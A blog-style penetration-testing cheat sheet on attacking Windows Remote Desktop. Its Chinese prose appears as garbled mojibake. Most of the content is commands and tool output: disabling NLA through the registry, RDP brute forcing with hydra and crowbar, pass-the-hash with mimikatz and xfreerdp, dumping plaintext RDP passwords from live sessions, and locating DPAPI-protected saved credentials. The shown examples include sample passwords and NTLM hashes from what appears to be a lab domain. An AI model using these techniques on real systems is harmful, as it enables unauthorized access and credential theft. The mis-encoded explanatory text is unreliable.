---
layout: post
title: Windows è¿œç¨‹æ¡Œé¢
category: Windows
tags: [rdp, mstsc, freerdp, rdesktop, tsclient]
---

## Remote Desktop Services

æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æœåŠ¡çš„ç«¯å£ï¼šï¼ˆ`0xd3d` åå…­è¿›åˆ¶è½¬åè¿›åˆ¶ `3389`ï¼‰

```console
PS C:\Windows\System32> REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    PortNumber    REG_DWORD    0xd3d
```

æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æœåŠ¡æ˜¯å¦å¼€å¯ï¼šï¼ˆ1 è¡¨ç¤ºå…³é—­ï¼Œ0 è¡¨ç¤ºå¼€å¯ï¼‰

```console
PS C:\Windows\System32> REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
    fDenyTSConnections    REG_DWORD    0x0
```

å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šï¼ˆè®¾ç½®â€œå…è®¸è¿œç¨‹è¿æ¥åˆ°æ­¤è®¡ç®—æœºâ€ï¼‰

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

å…³é—­è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼š

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000001 /f
```

å…³é—­ NLAï¼ˆNetwork Level Authenticationï¼Œç½‘ç»œçº§èº«ä»½éªŒè¯ï¼‰ï¼Œå½“ [UserAuthentication](https://learn.microsoft.com/zh-cn/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-userauthentication) ä¸º 0 ä»£è¡¨å…³é—­ï¼Œ1 ä»£è¡¨å¼€å¯ï¼š

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# 0ï¼šè¯´æ˜æ˜¯è¿›è¡Œè¿œç¨‹æ¡Œé¢å‰ä¸éœ€è¦ç”¨æˆ·èº«ä»½éªŒè¯ã€‚
# 1ï¼šè¯´æ˜æ˜¯è¿›è¡Œè¿œç¨‹æ¡Œé¢å‰éœ€è¦è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚
```

é€šè¿‡æŸ¥è¯¢ 3389 ç«¯å£çš„ç½‘ç»œè¿æ¥æˆ–æœåŠ¡è¯¦æƒ…éƒ½èƒ½æŸ¥çœ‹åˆ°æœåŠ¡çš„è¿›ç¨‹å·ï¼š

```console
PS C:\Windows\System32> netstat -ano | findstr '3389'
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2272
  TCP    [::]:3389              [::]:0                 LISTENING       2272
  UDP    0.0.0.0:3389           *:*                                    2272
  UDP    [::]:3389              *:*                                    2272

PS C:\Windows\System32> tasklist /svc | findstr 'TermService'
svchost.exe                   2272 TermService

PS C:\Windows\System32> cmd /c 'sc queryex TermService'

SERVICE_NAME: TermService
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2272
        FLAGS              :

PS C:\Windows\System32> tasklist /M:rdpcorets.dll

æ˜ åƒåç§°                       PID æ¨¡å—
========================= ======== ============================================
svchost.exe                   2272 rdpcorets.dll
```

### NLA - Network Level Authentication

å¯ç”¨æ­¤é€‰é¡¹åï¼Œç”¨æˆ·å¿…é¡»å…ˆå‘ç½‘ç»œéªŒè¯è‡ªå·±çš„èº«ä»½ï¼Œç„¶åæ‰èƒ½è¿æ¥åˆ°æ‚¨çš„ç”µè„‘ã€‚ï¼ˆé»˜è®¤å¼€å¯ï¼‰

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/ea033937381aa77d.png){: w="700" }

å¦‚æœè·å–åˆ°çš„ç”¨æˆ·å¯†ç å·²ç»è¿‡æœŸäº†ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ rdesktop è¿æ¥åˆ°æœªå¼€å¯ NLA çš„ä¸»æœºä¿®æ”¹å¯†ç ã€‚

Windows åŸç”Ÿçš„ mstsc.exe ä¸æ”¯æŒä½¿ç”¨å·²ç»è¿‡æœŸçš„å¯†ç è¿›å…¥åˆ°è¿œç¨‹ç™»å½•ç•Œé¢ï¼Œä¼šåœ¨è¿æ¥æ—¶å°±æç¤º `æ­¤ç”¨æˆ·å¸æˆ·çš„å¯†ç å·²è¿‡æœŸã€‚å¿…é¡»æ›´æ”¹å¯†ç æ‰èƒ½ç™»å½•ã€‚è¯·æ›´æ–°å¯†ç ï¼Œæˆ–è€…ä¸ç³»ç»Ÿç®¡ç†å‘˜æˆ–æŠ€æœ¯æ”¯æŒè”ç³»ã€‚` å¦‚ä¸‹å›¾ï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/93fb94af6792ab2e.png){: w="650" }

è·å–åˆ°çš„åŸŸç”¨æˆ·å‡­æ®è¿‡æœŸäº†ï¼š

```console
root@kali:~# proxychains4 -q cme smb 172.22.2.3/24 -u William -p Willg1UoO6Jt
SMB         172.22.2.16     445    MSSQLSERVER      [*] Windows Server 2016 Datacenter 14393 x64 (name:MSSQLSERVER) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.2.3      445    DC               [*] Windows Server 2016 Datacenter 14393 x64 (name:DC) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
SMB         172.22.2.18     445    UBUNTU-WEB02     [*] Windows 6.1 Build 0 (name:UBUNTU-WEB02) (domain:) (signing:False) (SMBv1:False)
SMB         172.22.2.34     445    CLIENT01         [*] Windows 10.0 Build 18362 x64 (name:CLIENT01) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.2.16     445    MSSQLSERVER      [-] xiaorang.lab\William:Willg1UoO6Jt STATUS_PASSWORD_EXPIRED
SMB         172.22.2.3      445    DC               [-] xiaorang.lab\William:Willg1UoO6Jt STATUS_PASSWORD_EXPIRED
SMB         172.22.2.18     445    UBUNTU-WEB02     [+] \William:Willg1UoO6Jt
SMB         172.22.2.34     445    CLIENT01         [-] xiaorang.lab\William:Willg1UoO6Jt STATUS_PASSWORD_EXPIRED
```

ä½¿ç”¨ CME çš„ RDP æ¨¡å—ï¼Œæ‰«ææœªå¼€å¯ NLA çš„ä¸»æœºï¼š

```console
root@kali:~# cme rdp 172.22.2.34
RDP         172.22.2.34     3389   CLIENT01         [*] Windows 10 or Windows Server 2016 Build 18362 (name:CLIENT01) (domain:xiaorang.lab) (nla:False)
```

ä½¿ç”¨ MSF çš„ RDP è„šæœ¬ï¼Œæ‰«ææœªå¼€å¯ NLA çš„ä¸»æœºï¼š

```console
msf6 > use scanner/rdp/rdp_scanner
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.22.2.34/24
rhosts => 172.22.2.34/24
msf6 auxiliary(scanner/rdp/rdp_scanner) > set threads 30
threads => 30
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 172.22.2.3:3389       - Detected RDP on 172.22.2.3:3389       (name:DC) (domain:XIAORANG) (domain_fqdn:xiaorang.lab) (server_fqdn:DC.xiaorang.lab) (os_version:10.0.14393) (Requires NLA: Yes)
[*] 172.22.2.16:3389      - Detected RDP on 172.22.2.16:3389      (name:MSSQLSERVER) (domain:XIAORANG) (domain_fqdn:xiaorang.lab) (server_fqdn:MSSQLSERVER.xiaorang.lab) (os_version:10.0.14393) (Requires NLA: Yes)
[*] 172.22.2.34:3389      - Detected RDP on 172.22.2.34:3389      (name:CLIENT01) (domain:XIAORANG) (domain_fqdn:xiaorang.lab) (server_fqdn:CLIENT01.xiaorang.lab) (os_version:10.0.18362) (Requires NLA: No)
[*] Auxiliary module execution completed
```

ä½¿ç”¨ [rdesktop](https://github.com/rdesktop/rdesktop) è¿æ¥æœªå¼€å¯ NLA çš„ä¸»æœºï¼Œä¿®æ”¹å¯†ç ï¼š

```console
root@kali:~# proxychains4 -q rdesktop 172.22.2.34 -d xiaorang.lab -u William -p Willg1UoO6Jt -z
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
```

## RDP Brute Force Attack

[crowbar](https://github.com/galkan/crowbar) ä½¿ç”¨ç¤ºä¾‹ï¼š

```console
root@kali:~# crowbar -b rdp -s 192.168.86.61/32 -u victim -C /root/words.txt -n 1
2017-10-10 14:59:55 START
2017-10-10 14:59:55 Crowbar v0.3.5-dev
2017-10-10 14:59:55 Trying 192.168.86.61:3389
2017-10-10 15:00:08 RDP-SUCCESS : 192.168.86.61:3389 - victim:s3cr3t
2017-10-10 15:00:08 STOP
```

[hydra](https://github.com/vanhauser-thc/thc-hydra) ä½¿ç”¨ç¤ºä¾‹ï¼š

```console
root@kali:~# cat ./user_passwd.txt
huangmin:8I5VZpg4Mf
zhangrong:cHY716Zauf
...

root@kali:~# cat ./targets.txt
172.22.14.46:3389
...

root@kali:~# proxychains4 -q hydra -C ./user_passwd.txt -M ./targets.txt rdp -f
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-04 23:22:47
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 3 servers, overall 12 tasks, 242 login tries, ~61 tries per task
[DATA] attacking rdp://(3 targets):3389/

[3389][rdp] host: 172.22.14.46   login: zhangshuai   password: wSbEajHzZs

[STATUS] attack finished for 172.22.14.46 (valid pair found)
[ERROR] child 10 sent nonsense data, killing and restarting it!
[STATUS] 581.00 tries/min, 581 tries in 00:01h, 145 to do in 00:01h, 8 active
3 of 3 targets successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-04 23:23:56
```

> æ³¨ï¼škali å†…ç½®çš„ [medusa](https://github.com/jmk-foofus/medusa) ä¸åŒ…å« rdp.mod æ¨¡å—ï¼ˆmedusa -d æŸ¥çœ‹å½“å‰æ‰€æœ‰æ¨¡å—ï¼‰ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨ medusa æ¥çˆ†ç ´ rdp éœ€è¦è‡ªè¡Œç¼–è¯‘ï¼ˆè¶…éº»çƒ¦çš„ ğŸ«¤ï¼‰ã€‚

[impacket-rdp_check](https://github.com/fortra/impacket/blob/master/examples/rdp_check.py) æ”¯æŒä½¿ç”¨å“ˆå¸Œæ¥ç¡®å®šç›®æ ‡æœºå™¨æ˜¯å¦å…è®¸è¯¥ç”¨æˆ·ä½¿ç”¨ RDP è¿›è¡Œç™»å½•ï¼š

```console
root@kali:~# impacket-rdp_check domain.com/administrator@10.10.10.11 -hashes :618B18AD4171A53695DD997AB02D55C4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Access Granted
```

[SharpRDPCheck](https://github.com/3gstudent/SharpRDPCheck/) ä¹Ÿå®ç°äº†è¿™ä¸€æ•ˆæœï¼š

```console
PS C:\Windows\System32> .\SharpRDPCheck.exe 192.168.70.128 3389 plaintext test test
[+] Valid:test  test

PS C:\Windows\System32> .\SharpRDPCheck.exe 192.168.70.128 3389 ntlmhash test 0cb6948805f797bf2a82807973b89537
[+] Valid:test  0cb6948805f797bf2a82807973b89537
```

## Pass-The-Hash with RDP

### Restricted Admin Mode

[Restricted Admin Mode](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190(v=ws.11)#restricted-admin-mode-for-remote-desktop-connection>)ï¼ˆå—é™ç®¡ç†æ¨¡å¼ï¼‰æä¾›äº†ä¸€ç§äº¤äº’å¼ç™»å½•è¿œç¨‹ä¸»æœºæœåŠ¡å™¨çš„æ–¹æ³•ï¼Œè€Œæ— éœ€å°†æ‚¨çš„å‡­æ®ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚å¦‚æœæœåŠ¡å™¨é­åˆ°ç ´åï¼Œè¿™å¯ä»¥é˜²æ­¢æ‚¨çš„å‡­æ®åœ¨åˆå§‹è¿æ¥è¿‡ç¨‹ä¸­è¢«çªƒå–ã€‚

å—é™ç®¡ç†å‘˜æ›´æ”¹äº†è¿œç¨‹æ¡Œé¢åè®®ï¼Œä½¿å…¶ä½¿ç”¨ç½‘ç»œç™»å½•è€Œä¸æ˜¯äº¤äº’å¼ç™»å½•è¿›è¡Œèº«ä»½éªŒè¯ã€‚æœ‰äº†è¿™ç§ä¿æŠ¤ï¼Œå»ºç«‹ RDP ä¼šè¯å°†ä¸éœ€è¦æä¾›å…³è”çš„å¯†ç ï¼›ç›¸åç”¨æˆ·çš„ NTLM Hash æˆ– Kerberos ç¥¨è¯å°†ç”¨äºèº«ä»½éªŒè¯ã€‚

**å—é™ç®¡ç†å‘˜æ¨¡å¼åªå¯¹ç®¡ç†å‘˜ç»„æˆå‘˜æœ‰æ•ˆã€‚å¦‚æœè·å–åˆ°çš„ç”¨æˆ·åªå±äºè¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•é€šè¿‡ hash ç™»å½•çš„ã€‚**

> æ³¨ï¼šä½¿ç”¨ NTLM hash è¿›è¡Œ RDP ç™»å½•ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½éœ€è¦å¼€å¯ `Restricted Admin Mode`ã€‚

---

æ–°å»º DWORD ç±»å‹é”®å€¼ DisableRestrictedAdminï¼Œ0 ä»£è¡¨å¼€å¯ï¼Œ1 ä»£è¡¨å…³é—­ï¼š

```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

æŸ¥è¯¢ DisableRestrictedAdmin çš„å€¼ï¼Œ`0x0` è¡¨ç¤ºå·²å¼€å¯ï¼š

```
REG QUERY HKLM\System\CurrentControlSet\Control\Lsa | findstr DisableRestrictedAdmin
```

Restricted Admin Mode æœ¬æ¥æ˜¯ä¸ºäº†æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œä½†æ˜¯å´æ”¯æŒäº† Pass-the-Hash çš„åˆ©ç”¨ã€‚

åœ¨é˜²å¾¡ä¸Šï¼Œåªéœ€è¦é’ˆå¯¹ Pass-the-Hash çš„åˆ©ç”¨è¿›è¡Œé˜²å¾¡å°±å¥½ï¼Œè¯¦æƒ…è§ï¼š[https://www.microsoft.com/en-us/download/details.aspx?id=36036](https://www.microsoft.com/en-us/download/details.aspx?id=36036)ã€‚

### Windows - mstsc.exe

å®¢æˆ·ç«¯è¿æ¥å‘½ä»¤ï¼š

```
mstsc.exe /restrictedadmin
```

åœ¨å¼€å¯ `Restricted Admin Mode` åï¼Œå¦‚æœä½ çš„ Windows ä¸æ”¯æŒï¼Œæ‰§è¡Œå‘½ä»¤åä¼šå¼¹å‡ºè¿œç¨‹æ¡Œé¢çš„å‚æ•°è¯´æ˜ï¼Œå¦‚ä¸‹å›¾ï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/d5d7ea25d4303702.png){: w="400" }

æ”»å‡»è€…ä½¿ç”¨ mimiketz è¿›è¡Œ pth è¿è¡Œè¿œç¨‹æ¡Œé¢ç¨‹åº Restricted Admin Modeï¼Œåœ¨è¿›è¡Œ RDP ç™»å½•æ—¶ä¸éœ€è¦å†è¾“å…¥å¯†ç ï¼Œç›´æ¥ç™»å½•å³å¯ï¼š

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:Administrator /domain:172.22.1.2 /ntlm:10cf89a850fb1cdbe6bb432b859164c8 "/run:mstsc.exe /restrictedadmin"
user    : Administrator
domain  : 172.22.1.2
program : mstsc.exe /restrictedadmin
impers. : no
NTLM    : 10cf89a850fb1cdbe6bb432b859164c8
  |  PID  6664
  |  TID  5700
  |  LSA Process is now R/W
  |  LUID 0 ; 1535426 (00000000:00176dc2)
  \_ msv1_0   - data copy @ 000002A6FB76A260 : OK !
  \_ kerberos - data copy @ 000002A6FB8DB5A8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000002A6FB6B9768 (32) -> null

mimikatz #
```

æ­¤æ—¶ä½¿ç”¨è¯¥ç”¨æˆ· hash æ‰§è¡Œäº† `/run:mstsc.exe /restrictedadmin` å‘½ä»¤ï¼Œåœ¨å¼¹å‡ºçš„è¿œç¨‹æ¡Œé¢è¿æ¥çª—å£ï¼Œè¾“å…¥ç›®æ ‡ä¸»æœºåœ°å€è¿›è¡Œè¿æ¥å¯ç›´æ¥è¿æ¥ä¸Šï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/830ee68e23c8d9ea.png)

å¦‚æœç›®æ ‡çš„å—é™ç®¡ç†æ¨¡å¼æ²¡æœ‰è¢«å¯åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ mimikatz è¿›è¡Œ PTHï¼š

```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:172.22.1.2 /ntlm:10cf89a850fb1cdbe6bb432b859164c8 /run:powershell.exe"
```

æ­¤æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç›®æ ‡ä¸»æœºçš„ PowerShell çª—å£ï¼Œåœ¨çª—å£ä¸­æ‰§è¡Œå‘½ä»¤ä¿®æ”¹ç›®æ ‡æ³¨å†Œè¡¨ï¼Œä»¥å¯ç”¨ Restricted Admin Modeï¼š

```powershell
Enter-PSSession -Computer <Target> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

ç°åœ¨ï¼Œå°±å¯ä»¥ä½¿ç”¨ NTLM hash è¿›è¡Œ RDP ç™»å½•äº†ã€‚

### Linux - FreeRDP

å®‰è£… [xfreerdp](https://github.com/FreeRDP/FreeRDP)ï¼š

```
sudo apt-get update
sudo apt-get install freerdp2-x11
```

å‘½ä»¤ï¼š

```
xfreerdp /u:John@Domain.com /pth:eec9381b043f098b011be51622282027 /v:xx.xx.xx.xx /cert-ignore
```

æ•ˆæœï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/5ad43cccb324a24e.png)

## Dumping RDP Credentials

### è·å–æ­£åœ¨è¿›è¡Œ RDP è¿æ¥çš„ç”¨æˆ·å‡­è¯

æƒ…å†µä¸€ï¼šåœ¨è·å–åˆ°ç›®æ ‡ä¸»æœºæ§åˆ¶æƒåï¼Œå‘ç°æœ‰äººæ­£åœ¨ RDP è¿æ¥å½“å‰ä¸»æœºã€‚

å¯ä»¥åœ¨å½“æœºä¸Šè¿è¡Œ mimikatz ä»æ­£åœ¨è¿è¡Œ RDP ä¼šè¯ä¸­æå–å‡ºå½“å‰ç”¨æˆ·çš„æ˜æ–‡å‡­æ®ï¼šï¼ˆåœ¨é«˜ç‰ˆæœ¬çš„ windows ä¸»æœºä¸­å¹¶ä¸å¥½ç”¨ï¼‰

```console
C:\Users\Administrator\Desktop> sc query termservice

SERVICE_NAME: termservice
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Windows\System32> .\mimikatz.exe 'privilege::debug' 'ts::logonpasswords' 'exit'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # ts::logonpasswords
!!! Warning: false positives can be listed !!!

   * Web Credentials? *
   Domain      : hostname_domain
   UserName    : administrator

  * Marshaled: [BinaryBlob] e7 03 00 00 00 00 00 00 0b e6 d8 02 90 0e 14 47 43 28 17 8f 81 6d 15 78 4f 98 25 11 12 ea a0 98
   * Web Credentials? *
   Domain      : hostname_domain
   UserName    : administrator

  * Marshaled: [BinaryBlob] e7 03 00 00 00 00 00 00 0b e6 d8 02 90 0e 14 47 43 28 17 8f 81 6d 15 78 4f 98 25 11 12 ea a0 98
   * Web Credentials? *
   Domain      : hostname_domain
   UserName    : administrator

  * Marshaled: [BinaryBlob] e7 03 00 00 00 00 00 00 0b e6 d8 02 90 0e 14 47 43 28 17 8f 81 6d 15 78 4f 98 25 11 12 ea a0 98
   Domain      : hostname_domain
   UserName    : Administrator
   Password/Pin: Admin@123

mimikatz(commandline) # exit
Bye!

```

æƒ…å†µäºŒï¼šåœ¨è·å–åˆ°ç›®æ ‡ä¸»æœºæ§åˆ¶æƒåï¼Œå‘ç°å½“å‰ä¸»æœºæ­£åœ¨ä½¿ç”¨ RDP å®¢æˆ·ç«¯è¿æ¥å…¶å®ƒè¿œç¨‹ä¸»æœºæ—¶ã€‚

å¯ä»¥ä»è¿›ç¨‹ mstsc.exe ä¸­æå–å‡ºæ‰€ä½¿ç”¨çš„ç”¨æˆ·æ˜æ–‡å‡­æ®ï¼š

```console
PS C:\Windows\System32> tasklist | findstr "mstsc.exe"
mstsc.exe                     8272 Console                    1    228,148 K

PS C:\Windows\System32> .\mimikatz.exe 'privilege::debug' 'ts::mstsc' 'exit'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # ts::mstsc
!!! Warning: false positives can be listed !!!

| PID 3060      mstsc.exe (module @ 0x00000000008DFBD0)

ServerName                                [wstring] 'xx.xx.xx.xx'
ServerFqdn                                [wstring] ''
UserSpecifiedServerName                   [wstring] 'xx.xx.xx.xx'
UserName                                  [wstring] 'Administrator'
Domain                                    [wstring] 'hostname_domain'
Password                                  [protect] 'Admin@123'
SmartCardReaderName                       [wstring] ''
PasswordContainsSCardPin                  [ bool  ] FALSE
ServerNameUsedForAuthentication           [wstring] 'xx.xx.xx.xx'
RDmiUsername                              [wstring] 'administrator'

mimikatz(commandline) # exit
Bye!
```

### è·å– RDP å†å²è¿æ¥å‡­è¯å’Œè§£å¯†å¯†é’¥

å½“ç”¨æˆ·åœ¨ä½¿ç”¨ RDP è¿æ¥è¿œç¨‹ä¸»æœºæ—¶ï¼Œå¦‚å›¾å‹¾é€‰äº†â€œè®°ä½æˆ‘çš„å‡­æ®â€ï¼Œé‚£ä¹ˆè¿æ¥è¿œç¨‹ä¸»æœºæ—¶æ‰€ä½¿ç”¨çš„ç”¨æˆ·å‡­è¯ä¼šè¢«ä¿å­˜åœ¨ç”¨æˆ·æœºå™¨ä¸Šï¼Œæ–¹ä¾¿ç”¨æˆ·ä¸‹ä¸€æ¬¡è¿›è¡Œè¿æ¥ï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/5a05a3c15b90e2f2.png)

è¿œç¨‹æ¡Œé¢æ‰€ä¿å­˜çš„ç”¨æˆ·èº«ä»½å‡­è¯ä½¿ç”¨ [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) (Data Protection Application Programming Interface, æ•°æ®ä¿æŠ¤ API) è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­ç”¨äºæ•°æ®ä¿æŠ¤çš„æ¥å£ï¼Œå¦‚ï¼šWIFI å¯†ç ã€VPNã€IE æµè§ˆå™¨ã€Chrome æµè§ˆå™¨ã€Outlook é‚®ç®±ç­‰åº”ç”¨éƒ½ä½¿ç”¨äº†è¯¥æ–¹å¼è¿›è¡ŒåŠ å¯†ã€‚

DPAPI åœ¨è¿›è¡Œæ•°æ®åŠ è§£å¯†çš„æ“ä½œæ—¶éœ€è¦ä½¿ç”¨ä¸€ä¸ª MasterKey å¯†é’¥ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½å¯¹åº”ä¸€ä¸ª MasterKeyï¼Œè€Œ MasterKey ä½¿ç”¨ç”¨æˆ·å¯†ç è¿›è¡ŒåŠ å¯†ã€‚MasterKey æ–‡ä»¶åœ¨æ“ä½œç³»ç»Ÿä¸­çš„ä½ç½®ï¼š

- ç”¨æˆ· MasterKey æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼š`%APPDATA%\Microsoft\Protect\<User_SID>\<Master_Key_File>`ï¼›
- ç³»ç»Ÿ MasterKey æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼š`%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User\<Master_Key_File>`ã€‚

```console
C:\Windows\System32>whoami /user

ç”¨æˆ·ä¿¡æ¯
----------------

ç”¨æˆ·å               SID
==================== ============================================
desktop-test\test    S-1-5-21-102229053-337446436-1419803206-1001

# ç”¨æˆ· Master Key Files ä½ç½®
C:\Windows\System32>dir /a /b /s %APPDATA%\Microsoft\Protect\
C:\Users\test\AppData\Roaming\Microsoft\Protect\CREDHIST
C:\Users\test\AppData\Roaming\Microsoft\Protect\S-1-5-21-102229053-337446436-1419803206-1001
C:\Users\test\AppData\Roaming\Microsoft\Protect\S-1-5-21-102229053-337446436-1419803206-1001\273001c6-c88c-422a-aecb-daa6f950f8d0
C:\Users\test\AppData\Roaming\Microsoft\Protect\S-1-5-21-102229053-337446436-1419803206-1001\52c3460d-2e8b-4764-957c-57185d4d62b2
C:\Users\test\AppData\Roaming\Microsoft\Protect\S-1-5-21-102229053-337446436-1419803206-1001\Preferred
```

> æ³¨ï¼šMaster Key File çš„åŒçº§ç›®å½•è¿˜æœ‰ä¸€ä¸ª Preferred æ–‡ä»¶ï¼Œæ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ­£åœ¨ä½¿ç”¨çš„ MasterKey åŠå…¶è¿‡æœŸæ—¶é—´ï¼Œé»˜è®¤ 90 å¤©æœ‰æ•ˆæœŸã€‚

ä»æ³¨å†Œè¡¨ä¸­æŸ¥çœ‹ RDP è¿æ¥è¿‡çš„æœåŠ¡å™¨ï¼š

```console
C:\Windows\System32> reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s

HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.70.130
    UsernameHint    REG_SZ    DESKTOP-TEST\administrator
```

å°†ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨è¿æ¥å‡­è¯çš„ RDP ä¼šè¯æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æ”»å‡»è€…æœ¬åœ°ç¯å¢ƒå†è¿›è¡Œç¦»çº¿è§£å¯†ï¼š

```console
C:\Windows\System32> dir /a /q %userprofile%\AppData\Local\Microsoft\Credentials\
 é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚
 å·çš„åºåˆ—å·æ˜¯ E8C4-028B

 C:\Users\test\AppData\Local\Microsoft\Credentials çš„ç›®å½•

2023/11/24  15:30    <DIR>          DESKTOP-TEST\test   .
2023/11/24  15:30    <DIR>          DESKTOP-TEST\test   ..
2023/11/24  15:30               482 DESKTOP-TEST\test   84BD531FDD20A7ED510558FA8768BA20
2023/10/24  00:23            11,106 DESKTOP-TEST\test   DFBE70A7E5CC19A398EBF1B96859CE5D
               2 ä¸ªæ–‡ä»¶         11,588 å­—èŠ‚
               2 ä¸ªç›®å½• 33,538,547,712 å¯ç”¨å­—èŠ‚

```

